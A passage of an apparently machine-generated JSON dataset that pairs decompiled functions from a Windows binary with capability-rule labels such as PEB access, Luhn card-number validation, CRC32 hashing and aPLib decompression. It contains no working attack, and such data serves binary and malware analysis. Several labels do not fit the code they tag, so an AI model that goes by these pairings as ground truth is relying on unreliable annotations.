        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004083b4(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_14ch;\n    uint lpFileTime;\n    uint lpLocalFileTime;\n    uint lpFatTime;\n    \n    uVar1 = fcn.00404468(&var_14ch);\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1(uVar1);\n    if ((iVar2 != -1) && (sub.kernel32.dll_FindClose_1(iVar2),  (var_14ch & 0x10) == 0)) {\n        sub.kernel32.dll_FileTimeToLocalFileTime(&lpFileTime, &lpLocalFileTime);\n        iVar2 = sub.kernel32.dll_FileTimeToDosDateTime(&lpLocalFileTime, &lpFatTime + 2, &lpFatTime);\n        if (iVar2 != 0) {\n            return lpFatTime;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 217
    },
    "00412780": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00412780(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*in_EAX == -1) && (in_EAX[1] == -1)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 57
    },
    "00416550": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416550(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00413bc0();\n    if (iVar1 != -1) {\n        fcn.00413a54();\n    }\n    iVar1 = fcn.00413bc0();\n    if (iVar1 < 0) {\n        fcn.00413a08();\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "004168c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.004168c0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00410920();\n    if (iVar1 == -1) {\n        fcn.00416888();\n    }\n    return iVar1;\n}\n",
        "token_count": 59
    },
    "0042e510": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.0042e510(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.00404468();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    return uVar2 & 0xffffff00 | uVar2 != 0xffffffff;\n}\n",
        "token_count": 78
    },
    "00438e3c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438e3c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.004033e4();\n    if (cVar1 == '\\0') {\n        fcn.00439974();\n    }\n    if (param_2 == in_EAX[0xc]) {\n        fcn.00438eec();\n    }\n    else {\n        fcn.0043a778();\n    }\n    if ((param_2 == 0) || (param_2 == -1)) {\n        (**(*in_EAX + 0x68))();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00446b88": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446b88(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x446d9f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x446bb5;\n    cVar1 = fcn.0044666c();\n    if (cVar1 != '\\0') {\n        puStack52 = 0x446bc7;\n        fcn.00447424();\n        puStack52 = 0x446bd4;\n        iVar2 = fcn.00446a48();\n        if (iVar2 != -1) {\n            uStack56 = 0x446d50;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack64 = 0x446bfb;\n            puStack52 = &stack0xfffffffc;\n            piVar3 = fcn.00421984();\n            uStack68 = 0x446d30;\n            uStack72 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffb8;\n            puStack76 = 0x446c1a;\n            puStack64 = &stack0xfffffffc;\n            (**(*piVar3 + 0x34))();\n            puStack76 = 0x446c28;\n            (**(*piVar3 + 0x40))();\n            puStack76 = 0x446c34;\n            piVar4 = fcn.00421984();\n            uStack80 = 0x446d13;\n            uStack84 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffac;\n            puStack76 = &stack0xfffffffc;\n            fcn.00422d1c();\n            (**(*piVar4 + 0x34))();\n            (**(*piVar4 + 0x40))();\n            fcn.00421f4c(0, 0, 0);\n            uVar5 = fcn.0041d804();\n            uVar5 = fcn.00446840(iVar2, uVar5);\n            sub.comctl32.dll_ImageList_Draw(uVar5);\n            fcn.00421f4c(0, 0, 0x10);\n            uVar5 = fcn.0041d804();\n            uVar5 = fcn.00446840(iVar2, uVar5);\n            sub.comctl32.dll_ImageList_Draw(uVar5);\n            uVar5 = (**(*piVar4 + 100))();\n            (**(*piVar3 + 100))(uVar5);\n            uVar5 = fcn.00446840();\n            iVar2 = sub.comctl32.dll_ImageList_Replace();\n            if (iVar2 == 0) {\n                fcn.00405b0c();\n                fcn.0040b538();\n                fcn.004039e4();\n            }\n            *in_FS_OFFSET = uVar5;\n            fcn.00403258(0x446d1a);\n            return;\n        }\n        puStack52 = 0x446d64;\n        fcn.00405b0c();\n        puStack52 = 0x446d73;\n        fcn.0040b538();\n        puStack52 = 0x446d78;\n        fcn.004039e4();\n    }\n    puStack52 = 0x446d84;\n    fcn.00403454();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x446da6;\n    uStack44 = 0x446d9e;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 974
    },
    "004470ec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004470ec(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint himl;\n    uint var_4h;\n    \n    puStack68 = 0x447117;\n    himl = param_2;\n    fcn.00412730(&fcn.004470ec::var_28h, *(in_EAX + 0x30));\n    puStack68 = 0x44711f;\n    fcn.00447d80();\n    uStack72 = 0x447285;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x447139;\n    puStack68 = &stack0xfffffffc;\n    var_ch = fcn.00421984();\n    uStack84 = 0x447268;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = 0x447158;\n    puStack80 = &stack0xfffffffc;\n    (**(*var_ch + 0x34))();\n    puStack92 = 0x447166;\n    (**(*var_ch + 0x40))();\n    puStack92 = 0x447172;\n    var_10h = fcn.00421984();\n    uStack96 = 0x44724b;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack92 = &stack0xfffffffc;\n    fcn.00422d1c();\n    (**(*var_10h + 0x34))();\n    (**(*var_10h + 0x40))();\n    uStack104 = himl;\n    iVar1 = sub.comctl32.dll_ImageList_GetImageCount();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if ((param_1 == -1) || (iVar3 == param_1)) {\n                var_14h = fcn.00421f4c();\n                fcn.0041d460();\n                uVar2 = fcn.0041d804(0, 0, 0);\n                sub.comctl32.dll_ImageList_Draw(himl, iVar3, uVar2);\n                var_18h = fcn.00421f4c();\n                fcn.0041d460();\n                fcn.0041d804(0, 0, 0x10);\n                uStack104 = himl;\n                sub.comctl32.dll_ImageList_Draw();\n                fcn.0044697c();\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack104;\n    uStack96 = 0x447252;\n    uStack100 = 0x44724a;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 787
    },
    "0044baec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0044baec(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0044bab8();\n    if (iVar1 == -1) {\n        fcn.00448d90();\n    }\n    fcn.0044b994();\n    return;\n}\n",
        "token_count": 66
    },
    "0044d364": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044d364(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_EDX;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if ((in_EDX & 0x10) == 0) {\n        iVar1 = sub.user32.dll_GetMenuItemID();\n        if (iVar1 != -1) {\n            iVar3 = fcn.0044cba8();\n        }\n    }\n    else {\n        sub.user32.dll_GetSubMenu();\n        iVar3 = fcn.0044cba8();\n    }\n    if (iVar3 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.00450650();\n    }\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "00457064": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00457064(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    *(in_EAX + 0x60) = uVar1;\n    iVar2 = -0x16;\n    do {\n        sub.user32.dll_LoadCursorA();\n        fcn.0045711c();\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != -1);\n    return;\n}\n",
        "token_count": 125
    },
    "004573cc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004573cc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *puVar2;\n    \n    uVar1 = 0;\n    if (param_2 != -1) {\n        for (puVar2 = *(in_EAX + 0x5c); (puVar2 != NULL && (param_2 != puVar2[1])); puVar2 = *puVar2) {\n        }\n        if (puVar2 == NULL) {\n            uVar1 = *(in_EAX + 0x60);\n        }\n        else {\n            uVar1 = puVar2[2];\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 164
    },
    "00403da0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00403da0(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0x10;\n    iVar1 = *0x461000;\n    do {\n        *((uVar2 & 0xff) + 0x46106c) = iVar1 % 10 + '0';\n        iVar1 = iVar1 / 10;\n        uVar2 = uVar2 - 1;\n    } while (iVar1 != 0);\n    uVar3 = 0x1c;\n    uVar2 = *0x461004;\n    do {\n        *((uVar3 & 0xff) + 0x46106c) = *((uVar2 & 0xf) + 0x46108c);\n        uVar2 = uVar2 >> 4;\n        uVar3 = uVar3 - 1;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 219
    },
    "00407e1a": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407e1a(uint param_1, uint32_t param_2)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    do {\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / 10;\n        puVar6 = puVar6 + -1;\n        cVar4 = uVar1 % 10;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n    } while (in_EAX != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar2 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar2)[iVar5] = 0x30;\n        }\n        puVar6[iVar2] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "00408d8c": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00408d8c(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar2;\n    uint in_EAX;\n    uint32_t uVar1;\n    char unaff_BL;\n    uint32_t *puVar3;\n    uchar *unaff_EDI;\n    char *pcVar4;\n    uint32_t uStack8;\n    \n    *unaff_EDI = in_EAX;\n    if (unaff_BL == '\\0') {\n        param_2 = 0;\ncode_r0x00408da2:\n        cVar2 = in_EAX >> 8;\n        pcVar4 = unaff_EDI + 1;\n        if (cVar2 == '\\0') goto code_r0x00408da9;\n    }\n    else {\n        if (-1 < param_2) goto code_r0x00408da2;\n        cVar2 = '-';\n        param_2 = -param_2;\n    }\n    pcVar4 = unaff_EDI + 2;\n    unaff_EDI[1] = cVar2;\ncode_r0x00408da9:\n    puVar3 = &uStack8;\n    uStack8 = param_2;\n    do {\n        do {\n            uVar1 = param_2 / *0x461174;\n            *puVar3 = param_2 % *0x461174 + '0';\n            puVar3 = puVar3 + 1;\n            param_1 = param_1 + -1;\n            param_2 = uVar1;\n        } while (uVar1 != 0);\n    } while (0 < param_1);\n    do {\n        puVar3 = puVar3 + -1;\n        *pcVar4 = *puVar3;\n        pcVar4 = pcVar4 + 1;\n    } while (puVar3 != &uStack8);\n    return uStack8;\n}\n",
        "token_count": 420
    },
    "004091f3": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004091f3(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar7;\n    uint16_t uVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    int16_t *unaff_EBX;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    bool bVar14;\n    float10 fVar15;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    uVar6 = *unaff_ESI;\n    uVar10 = unaff_ESI[1];\n    if ((uVar6 | uVar10) != 0) {\n        if (uVar10 < 0) {\n            bVar14 = uVar6 != 0;\n            uVar6 = -uVar6;\n            uVar10 = -bVar14 - uVar10;\n        }\n        iVar8 = 0;\n        iVar11 = *(unaff_EBP + 8);\n        if (iVar11 < 0) {\n            iVar11 = 0;\n        }\n        if (3 < iVar11) {\n            iVar11 = 4;\n            uVar2 = uVar6;\n            iVar3 = iVar8;\n            do {\n                iVar8 = iVar3;\n                uVar6 = uVar2;\n                bVar14 = 0xde0b6b2 < uVar10;\n                uVar1 = uVar10 + 0xf21f494d;\n                uVar10 = uVar1 - (uVar6 < 0xa7640000);\n                uVar2 = uVar6 + 0x589c0000;\n                iVar3 = iVar8 + 1;\n            } while (bVar14 && (uVar6 < 0xa7640000) <= uVar1);\n            uVar10 = uVar10 + 0xde0b6b3 + (0x589bffff < uVar6 + 0x589c0000);\n        }\n        *(unaff_EBP + -0x20) = uVar6;\n        *(unaff_EBP + -0x1c) = uVar10;\n        fVar15 = *(unaff_EBP + -0x20);\n        if (4 - iVar11 != 0) {\n            fVar15 = fVar15 / *(*(unaff_EBP + -4) + 0x4091df + (4 - iVar11) * 4);\n        }\n        *(unaff_EBP + -0x18) = fVar15;\n        piVar12 = unaff_EBX + 3;\n        if (iVar8 != 0) {\n            piVar13 = unaff_EBX + 2;\n            *piVar12 = iVar8 + '0';\n            iVar8 = 9;\n            goto code_r0x0040928a;\n        }\n        iVar8 = 9;\n        do {\n            uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n            uVar4 = CONCAT11(uVar9, uVar9 >> 4);\n            piVar13 = piVar12;\n            if (uVar9 >> 4 != 0) goto code_r0x00409293;\n            uVar7 = uVar4 >> 8;\n            if ((uVar9 & 0xf) != 0) goto code_r0x0040929a;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    iVar5 = 0;\n    uVar9 = 0;\n    *(unaff_EBX + 3) = 0;\ncode_r0x004092c0:\n    *unaff_EBX = iVar5;\n    *(unaff_EBX + 1) = uVar9;\n    return;\ncode_r0x0040929a:\n    while( true ) {\n        piVar13 = piVar12 + 1;\n        *piVar12 = (uVar7 & 0xf) + 0x30;\n        iVar8 = iVar8 + -1;\n        if (iVar8 == 0) break;\ncode_r0x0040928a:\n        uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n        uVar4 = CONCAT11(uVar9, uVar9 >> 4);\ncode_r0x00409293:\n        uVar7 = uVar4 >> 8;\n        piVar12 = piVar13 + 1;\n        *piVar13 = uVar4 + '0';\n    }\n    iVar5 = piVar13 - (unaff_EBX + 3 + iVar11);\n    do {\n        *piVar13 = '\\0';\n        piVar13 = piVar13 + -1;\n    } while (*piVar13 == '0');\n    uVar9 = unaff_ESI[1] >> 0x1f;\n    goto code_r0x004092c0;\n}\n",
        "token_count": 1147
    },
    "00457acc": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00457acc(void)\n\n{\n    fcn.0040cf1c();\n    return;\n}\n",
        "token_count": 25
    },
    "004041d0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004041d0(uint param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    int16_t *piVar2;\n    \n    arg_8h = 0;\n    piVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar2 != 0; piVar2 = piVar2 + 4) {\n            if (piVar2[1] == 0) {\ncode_r0x004041f9:\n                piVar2 = piVar2 + 1;\n                break;\n            }\n            if (piVar2[2] == 0) {\ncode_r0x004041f6:\n                piVar2 = piVar2 + 1;\n                goto code_r0x004041f9;\n            }\n            if (piVar2[3] == 0) {\n                piVar2 = piVar2 + 1;\n                goto code_r0x004041f6;\n            }\n        }\n        arg_8h = piVar2 - param_2 >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.00403fa8(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.004040c8(arg_8h),  -1 < iVar1)) {\n        fcn.00404098();\n    }\n    else {\n        fcn.004045f4();\n        fcn.004040c8(arg_8h);\n        fcn.004045f4();\n    }\n    return;\n}\n",
        "token_count": 369
    },
    "00404230": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404230(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    if (param_2 != 0) {\n        arg_8h = *(param_2 + -4) >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.00403fa8(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.004040c8(arg_8h),  -1 < iVar1)) {\n        fcn.00404098();\n    }\n    else {\n        fcn.004045f4();\n        fcn.004040c8(arg_8h);\n        fcn.004045f4();\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "004046c4": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027ec)\n\nvoid __fastcall fcn.004046c4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((param_2 != 0) && (*(param_2 + -4) >> 1 != 0)) {\n        iVar1 = sub.oleaut32.dll_SysReAllocStringLen();\n        if (iVar1 != 0) {\n            return;\n        }\n        if (*0x463008 != NULL) {\n            (**0x463008)();\n        }\n        fcn.004027c0();\n        return;\n    }\n    iVar1 = *in_EAX;\n    if (iVar1 != 0) {\n        *in_EAX = 0;\n        sub.oleaut32.dll_SysFreeString(iVar1);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00404798": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027ec)\n\nvoid __fastcall fcn.00404798(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    uVar3 = 0;\n    piVar4 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar4 != 0; piVar4 = piVar4 + 2) {\n            if (*(piVar4 + 2) == 0) {\ncode_r0x004047c1:\n                piVar4 = piVar4 + 2;\n                break;\n            }\n            if (*(piVar4 + 1) == 0) {\ncode_r0x004047be:\n                piVar4 = piVar4 + 2;\n                goto code_r0x004047c1;\n            }\n            if (*(piVar4 + 6) == 0) {\n                piVar4 = piVar4 + 2;\n                goto code_r0x004047be;\n            }\n        }\n        uVar3 = piVar4 - param_2 >> 1;\n    }\n    if (uVar3 == 0) {\n        iVar2 = *in_EAX;\n        if (iVar2 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar2);\n        }\n        return;\n    }\n    iVar2 = sub.oleaut32.dll_SysAllocStringLen(param_2, uVar3);\n    if (iVar2 != 0) {\n        iVar1 = *param_2;\n        *param_2 = iVar2;\n        sub.oleaut32.dll_SysFreeString(iVar1);\n        return;\n    }\n    if (*0x463008 != NULL) {\n        (**0x463008)();\n    }\n    fcn.004027c0();\n    return;\n}\n",
        "token_count": 443
    },
    "004047f4": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.004047f4(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0041565c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041565c(code *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    do {\n        var_10h = var_8h + in_ECX >> 1;\n        uVar3 = var_8h;\n        uVar4 = in_ECX;\n        do {\n            while (iVar2 = (*arg_8h)(),  iVar2 < 0) {\n                uVar3 = uVar3 + 1;\n            }\n            while (iVar2 = (*arg_8h)(),  0 < iVar2) {\n                uVar4 = uVar4 - 1;\n            }\n            if (uVar3 <= uVar4) {\n                fcn.00415374();\n                uVar1 = uVar4;\n                if ((uVar3 != var_10h) && (uVar1 = var_10h,  uVar4 == var_10h)) {\n                    uVar1 = uVar3;\n                }\n                var_10h = uVar1;\n                uVar3 = uVar3 + 1;\n                uVar4 = uVar4 - 1;\n            }\n        } while (uVar3 <= uVar4);\n        if (var_8h < uVar4) {\n            fcn.0041565c(arg_8h);\n        }\n        var_8h = uVar3;\n    } while (uVar3 < in_ECX);\n    return;\n}\n",
        "token_count": 396
    },
    "00404944": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2",
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027ec)\n\nvoid __fastcall fcn.00404944(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    \n    if (param_1 == 0) {\n        return;\n    }\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00404944();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00404914();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x463008 != NULL) {\n                (**0x463008)();\n            }\n            fcn.004027c0();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar3 = param_1 + -1;\n        bVar2 = 0 < param_1;\n        param_1 = iVar3;\n    } while (iVar3 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 508
    },
    "00404b40": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027ec)\n\nvoid __fastcall fcn.00404b40(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar6;\n    \n    puVar6 = *(param_1 + 1) + 10 + param_1;\n    iVar5 = puVar6[-1];\n    iVar4 = 0;\n    iVar2 = puVar6[-2];\n    do {\n        if (iVar4 < puVar6[1]) {\n            fcn.004028b8();\n        }\n        pcVar3 = **puVar6;\n        cVar1 = *pcVar3;\n        if (cVar1 == '\\n') {\n            fcn.00403ffc();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\v') {\n            fcn.004046c4();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\f') {\n            fcn.00404b28();\n            iVar4 = 0x10;\n        }\n        else if (cVar1 == '\\r') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 6);\n            fcn.00404c5c(iVar4, *(pcVar3 + pcVar3[1] + 2));\n        }\n        else if (cVar1 == '\\x0e') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 2);\n            fcn.00404b40();\n        }\n        else if (cVar1 == '\\x0f') {\n            fcn.00405660();\n            iVar4 = 4;\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x463008 != NULL) {\n                    (**0x463008)(unaff_EDI, unaff_ESI);\n                }\n                fcn.004027c0();\n                return;\n            }\n            fcn.00404fa4();\n            iVar4 = 4;\n        }\n        iVar4 = iVar4 + puVar6[1];\n        puVar6 = puVar6 + 2;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    if (iVar4 < iVar2) {\n        fcn.004028b8();\n    }\n    return;\n}\n",
        "token_count": 558
    },
    "00404c5c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
